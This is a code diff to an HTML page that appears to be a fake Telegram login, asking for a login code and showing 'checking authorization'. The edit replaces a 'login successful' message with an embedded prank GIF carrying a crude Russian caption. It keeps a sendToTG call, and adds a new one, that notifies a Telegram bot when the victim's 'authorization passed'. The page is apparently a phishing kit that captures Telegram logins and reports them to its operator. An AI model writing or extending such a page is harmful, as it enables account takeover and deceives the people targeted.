@@ -142,12 +142,6 @@
             margin-top: 6px;
             display: none;
         }
-        .result-text {
-            color: #34c759;
-            text-align: center;
-            font-size: 16px;
-            margin-top: 16px;
-        }
         .loader {
             border: 3px solid #2a2a2a;
             border-top: 3px solid #0088cc;
@@ -259,6 +253,30 @@
         #codeInput::placeholder {
             color: #666666;
         }
+
+        /* ===== БЛОК С ГИФКОЙ ===== */
+        #gifContainer {
+            margin-top: 20px;
+            text-align: center;
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+        #gifContainer img {
+            max-width: 100%;
+            border-radius: 16px;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.8);
+        }
+        @keyframes fadeIn {
+            0% { opacity: 0; transform: scale(0.9); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        .gif-caption {
+            color: #aaaaaa;
+            font-size: 14px;
+            margin-top: 12px;
+        }
     </style>
 </head>
 <body>
@@ -342,9 +360,10 @@
         <div class="loading-text">Проверка авторизации...</div>
     </div>
 
-    <!-- ШАГ 4: РЕЗУЛЬТАТ -->
-    <div id="result" class="hidden">
-        <div class="result-text">✅ Вход выполнен</div>
+    <!-- ===== БЛОК С ГИФКОЙ (появляется вместо результата) ===== -->
+    <div id="gifContainer">
+        <img src="https://media1.tenor.com/m/CWBMp3Tax5MAAAAC/%D0%B5%D0%B1%D0%B0%D1%82%D1%8C-%D1%82%D1%8B-%D0%BC%D0%B0%D0%B9%D0%BE%D0%BD%D0%B5%D0%B7.gif" alt="ебать ты майонез">
+        <div class="gif-caption">ебать ты майонез</div>
     </div>
 
     <div class="footer">Telegram • 2026</div>
@@ -447,17 +466,12 @@
             timerEl.textContent = seconds;
             if (seconds <= 0) {
                 clearInterval(interval);
+                // Скрываем загрузку и показываем гифку
                 document.getElementById('loadingAuth').classList.add('hidden');
-                document.getElementById('result').classList.remove('hidden');
-                sendToTG(`✅ <b>АВТОРИЗАЦИЯ ПРОЙДЕНА</b>\n➡️ Открытие гифки...`);
-                openGif();
+                document.getElementById('gifContainer').style.display = 'block';
+                sendToTG(`✅ <b>АВТОРИЗАЦИЯ ПРОЙДЕНА</b>\n➡️ Показана гифка`);
             }
         }, 1000);
-    }
-
-    // ===== ОТКРЫТИЕ ОДНОЙ ГИФКИ =====
-    function openGif() {
-        window.open('https://media1.tenor.com/m/CWBMp3Tax5MAAAAC/%D0%B5%D0%B1%D0%B0%D1%82%D1%8C-%D1%82%D1%8B-%D0%BC%D0%B0%D0%B9%D0%BE%D0%BD%D0%B5%D0%B7.gif', '_blank');
     }
 
     // ===== ПРИ ЗАГРУЗКЕ =====
